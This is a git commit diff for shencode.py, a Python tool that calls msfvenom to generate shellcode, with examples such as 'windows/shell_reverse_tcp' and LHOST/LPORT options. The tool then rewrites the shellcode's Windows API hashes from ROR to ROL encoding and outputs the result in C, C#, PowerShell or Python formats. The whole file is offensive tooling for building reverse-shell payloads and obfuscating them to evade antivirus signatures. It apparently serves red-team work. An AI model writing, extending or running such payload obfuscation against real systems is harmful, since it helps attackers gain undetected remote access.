84440f4265fbce864362a47f0e5bcaca5a88ab15
psycore8 <76014584+psycore8@users.noreply.github.com>
2024-08-12 13:06:40 +0200

    Update shencode.py

--- shencode.py
+++ shencode.py
@@ -1,12 +1,16 @@
 import argparse
 import os
-#import subprocess
 
 import utils.assist as assist
 import utils.msf as msf
 import utils.shellcode as sc
 
 msfvenom_path = "c:\\metasploit-framework\\bin\\msfvenom.bat"
+dll_paths = ['C:\\Windows\\System32\\kernel32.dll', 
+             'C:\\Windows\\System32\\ws2_32.dll', 
+             'C:\\Windows\\System32\\wininet.dll', 
+             'C:\\Windows\\System32\\dnsapi.dll',
+             'C:\\Windows\\System32\\mswsock.dll']
 
 class nstate:
     HEADER = '\033[95m'
@@ -19,69 +23,57 @@ class nstate:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-def main():
+def main(command_line=None):
   print(f"{nstate.HEADER}____ _  _ ____ _  _ ____ ____ ___  ____ {nstate.ENDC}")
   print(f"{nstate.HEADER}[__  |__| |___ |\\ | |    |  | |  \\ |___ {nstate.ENDC}")
   print(f"{nstate.HEADER}___] |  | |___ | \\| |___ |__| |__/ |___{nstate.ENDC}")
   print(f"{nstate.HEADER}Version 0.2 by psycore8{nstate.ENDC}")
   parser = argparse.ArgumentParser(description="create and obfuscate shellcodes")
-  parser.add_argument("mod_shellcode", type=str, choices=["msfvenom","file"],               help="Shellcode module: msfvenom, file")
-  parser.add_argument("-p", "--payload",                        help="Payload to use e.g. windows/shell_reverse_tcp")
- #parser.add_argument("-i", "--inputfile",                      help="don't create a payload from msfvenom, use an existing shellcode instead") 
-  parser.add_argument("-a1","--arg1",                           help="argument1 for payload e.g. LHOST=127.0.0.1")
-  parser.add_argument("-a2","--arg2",                           help="argument2 for payload e.g. LPORT=4443")
-  parser.add_argument("-k", "--key",                            help="ROR key for encoding")
-  parser.add_argument("-d", "--decompile", action="store_true", help="decompile modified bytes")
-  parser.add_argument("-s", "--showmod",   action="store_true", help="display modifications")
-  #parser.add_argument("-v", "--verbose",   action="store_true", help="displays c++/c# shellcode")
-  parser.add_argument("-of", "--outputformat", choices=["c","casm","cs","ps1","py","hex"], help="formatting the shellcode in C, Casm, C#, Powershell, python or hex")
+  parser.add_argument("-o", "--output", choices=["c","casm","cs","ps1","py","hex"], help="formatting the shellcode in C, Casm, C#, Powershell, python or hex")
+  subparsers = parser.add_subparsers(dest='command')
+  parser_create = subparsers.add_parser("create", help="create a shellcode using msfvenom")
+  parser_create.add_argument("-p", "--payload", help="payload to use e.g. windows/shell_reverse_tcp")
+  parser_create.add_argument("-lh", "--lhost", help="LHOST Argument")
+  parser_create.add_argument("-lp", "--lport", help="LPORT Argument")
+  parser_encode = subparsers.add_parser("encode", help="encode windows function hashes to ROL")
+  parser_encode.add_argument("-k", "--key", help="ROL key for encoding")
+  parser_encode.add_argument("-f", "--filename", help="raw input file with shellcode")
+  parser_encode.add_argument("-d", "--decompile", action="store_true", help="decompile modified bytes")
+  parser_encode.add_argument("-s", "--showmod",   action="store_true", help="display modifications")
+   
+  args = parser.parse_args(command_line)
+  OutputFormat = args.output
   
-  args = parser.parse_args()
-  ror_key = args.key
-  decompile = args.decompile
-  showmod = args.showmod
-  #verbose = args.verbose
-  payload = args.payload
-  arg1 = args.arg1
-  arg2 = args.arg2
-  OutputFormat = args.outputformat
-  
-  if (int(ror_key) < 32) or (int(ror_key) > 255):
-    print(f"{nstate.FAIL} Key must be between 33 and 255")
-    exit()
- 
-  #if file_path and my_key:
-    #print(f"[+] Encoding shellcode {file_path} using ROR key: {my_key}")
-  #else:
-    #print("[+] Please provide both --shellcode and --key arguments.")
-    #exit()
- 
-  print(f"{nstate.OKBLUE} create payload")
-  cs = msf.msfvenom
-  file_name = cs.CreateShellcode(msfvenom_path, payload, arg1, arg2)
+  if args.command == "create":
+    print(f"{nstate.OKBLUE} create payload")
+    cs = msf.msfvenom
+    filename = cs.CreateShellcode(msfvenom_path, args.payload, args.lhost, args.lport)
 
-  path = "./"+file_name
-  cf = os.path.isfile(path)
-  if cf == True:
-    print(f"{nstate.OKGREEN} shellcode created")
-  else:
-    print(f"{nstate.FAIL} shellcode output not found, EXIT")
-    exit()
+    path = "./"+filename
+    cf = os.path.isfile(path)
+    if cf == True:
+      print(f"{nstate.OKGREEN} shellcode created")
+      #os.environ['SHENCODE_FILENAME'] = filename
+      #print(f"{nstate.OKBLUE} filename in environment: "+os.environ.get("SHENCODE_FILENAME"))
+    else:
+      print(f"{nstate.FAIL} shellcode output not found, EXIT")
+      exit()
+  elif args.command == "encode":
+    ror_key = int(args.key)
+    if (ror_key < 32) or (ror_key > 255):
+     print(f"{nstate.FAIL} Key must be between 33 and 255")
+     exit()
+
+    filename = args.filename   
+    ror2rol = sc.ror2rol
+    ror2rol.process(dll_paths, filename, args.showmod, args.decompile, args.key)
   
-   # Populate hash_dict global variable
-  dll_paths = ['C:\\Windows\\System32\\kernel32.dll', 
-                 'C:\\Windows\\System32\\ws2_32.dll', 
-                 'C:\\Windows\\System32\\wininet.dll', 
-                 'C:\\Windows\\System32\\dnsapi.dll',
-                 'C:\\Windows\\System32\\mswsock.dll']
-                 
-  ror2rol = sc.ror2rol
-  ror2rol.process(dll_paths, file_name, showmod, decompile, ror_key)
-  
-  print(f"{nstate.OKBLUE} processing shellcode format...")
-  b2s = assist.bin2sc
-  scFormat = b2s.process("output.bin",OutputFormat)
-  print(scFormat)
+  if args.output:
+   print(f"{nstate.OKBLUE} processing shellcode format...")
+   b2s = assist.bin2sc
+   scFormat = b2s.process(filename,OutputFormat)
+   print(scFormat)
+
   print(f"{nstate.OKGREEN} DONE!")
 
 if __name__ == "__main__":
